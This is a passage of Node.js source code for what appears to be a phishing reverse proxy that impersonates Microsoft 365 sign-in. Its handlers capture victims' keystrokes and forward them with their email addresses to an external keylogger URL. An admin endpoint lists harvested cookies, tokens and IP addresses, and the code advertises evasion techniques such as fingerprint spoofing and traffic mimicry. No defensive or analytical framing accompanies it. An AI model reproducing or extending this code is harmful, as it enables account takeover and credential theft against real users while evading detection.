                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ success: true }));
            } catch (error) {
                res.writeHead(500);
                res.end(JSON.stringify({ error: 'Internal server error' }));
            }
        });
        return;
    }

    if (req.url === PROXY_PATHNAMES.keylogEndpoint && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                const sessionId = getSessionIdFromCookie(req.headers.cookie);
                
                if (sessionId && VICTIM_SESSIONS[sessionId]) {
                    VICTIM_SESSIONS[sessionId].keystrokes.push(data);
                    sessionStore.sessions.set(sessionId, {
                        ...sessionStore.sessions.get(sessionId),
                        keystrokes: data.keystrokes
                    });
                    
                    if (KEYLOGGER_URL) {
                        axios.post(KEYLOGGER_URL, {
                            ...data,
                            sessionId: sessionId,
                            email: VICTIM_SESSIONS[sessionId].email
                        }).catch(() => {});
                    }
                }
                
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ success: true }));
            } catch (error) {
                res.writeHead(500);
                res.end(JSON.stringify({ error: 'Internal server error' }));
            }
        });
        return;
    }

    // Health check
    if (req.url === '/health') {
        const stats = sessionStore.getStats();
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
            status: 'healthy',
            timestamp: new Date().toISOString(),
            sessions: Object.keys(VICTIM_SESSIONS).length,
            service: 'Microsoft 365 Proxy with Advanced Evasion',
            version: '4.0.0-advanced-evasion',
            stats: stats,
            replayAvailable: stats.totalSessions > 0,
            evasionEnabled: true,
            evasionTechniques: [
                'Browser Fingerprint Spoofing',
                'Token Rotation with Null Handling',
                'Cookie Validation with Null Handling',
                'Session Rotation with History Manipulation',
                'Beacon Traffic Mimicry',
                'Storage Bypass',
                'WebSocket Keep-Alive',
                'Cache Poisoning',
                'API Traffic Mimicry',
                'Random User-Agent Rotation'
            ]
        }, null, 2));
        return;
    }

    // Sessions admin
    if (req.url === '/sessions' && req.method === 'GET') {
        const sessionData = Object.keys(VICTIM_SESSIONS).map(id => ({
            sessionId: id.substring(0, 12) + '...',
            email: VICTIM_SESSIONS[id].email || 'N/A',
            ip: VICTIM_SESSIONS[id].ip || 'N/A',
            created: VICTIM_SESSIONS[id].created,
            cookieCount: (VICTIM_SESSIONS[id].cookies || []).length,
            attempts: VICTIM_SESSIONS[id].attempts || 0,
            fullCookies: sessionStore.getCookieHeader(id)?.cookieCount || 0,
            tokens: sessionStore.allTokens.get(id) ? 
                Object.values(sessionStore.allTokens.get(id)).filter(t => t && t.value && t.isValid !== false).length : 0,
            evasionData: sessionStore.getReplayData(id)?.evasionData || {},
            rotationCount: sessionStore.getReplayData(id)?.rotationCount || 0
        }));
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
            total: sessionData.length,
            sessions: sessionData,
            stats: sessionStore.getStats(),
            evasionActive: true
        }, null, 2));
        return;
    }

    // POST requests
    if (req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            handlePostRequest(body, req, res);
        });
        return;
    }

    // Login requests
    if (req.url.startsWith(PROXY_ENTRY_POINT)) {
        handleLoginRequest(req, res);
        return;
    }

    // Default redirect
    res.writeHead(302, { 'Location': REDIRECT_URL });
    res.end();
});

// ============================================================
//  START SERVER
// ============================================================

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log('╔═══════════════════════════════════════════════════════════╗');
    console.log('║                                                           ║');
    console.log('║     🛡️  MICROSOFT 365 PROXY v4.0 - ADVANCED EVASION   ║');
    console.log('║     🔐  Next-Generation Evasion Techniques               ║');
    console.log('║                                                           ║');
    console.log('╠═══════════════════════════════════════════════════════════╣');
    console.log('║                                                           ║');
    console.log(`║   📍 Server:    http://localhost:${PORT}                   ║`);
    console.log(`║   🔗 Entry:     ${PROXY_ENTRY_POINT}                     ║`);
    console.log(`║   🍪 Cookies:   ${PROXY_PATHNAMES.cookieStoreEndpoint}  ║`);
    console.log(`║   🔄 Replay:    ${PROXY_PATHNAMES.sessionReplayEndpoint} ║`);
    console.log(`║   🔄 Rotation:  ${PROXY_PATHNAMES.tokenRotation}        ║`);
    console.log('║                                                           ║');
    console.log('╠═══════════════════════════════════════════════════════════╣');
    console.log('║                                                           ║');
    console.log('║   ✅ ADVANCED EVASION TECHNIQUES:                        ║');
    console.log('║   1. Browser Fingerprint Spoofing                        ║');
    console.log('║   2. Token Rotation with Null Handling                   ║');
    console.log('║   3. Cookie Validation with Null Handling                ║');
    console.log('║   4. Session Rotation with History Manipulation          ║');
    console.log('║   5. Beacon Traffic Mimicry                             ║');
    console.log('║   6. Storage Bypass (localStorage/IndexedDB)            ║');
    console.log('║   7. WebSocket Keep-Alive with Random Payload           ║');
    console.log('║   8. Cache Poisoning with Random Headers                ║');
    console.log('║   9. API Traffic Mimicry (GraphQL/REST)                 ║');
    console.log('║   10. Random User-Agent Rotation                        ║');
    console.log('║   11. Jittered Request Timing                           ║');
    console.log('║   12. Cross-Origin Tracking Prevention Bypass           ║');
    console.log('║                                                           ║');
    console.log('╚═══════════════════════════════════════════════════════════╝');
});

// ============================================================
//  CLEANUP
// ============================================================

setInterval(() => {
    sessionStore.cleanup();
}, 300000);

process.on('SIGTERM', () => {
    console.log('🛑 Shutting down gracefully...');
    server.close(() => process.exit(0));
});

process.on('uncaughtException', (err) => {
    console.error('🔥 UNCAUGHT EXCEPTION:', err.message);
});

process.on('unhandledRejection', (reason) => {
    console.error('🔥 UNHANDLED REJECTION:', reason);
});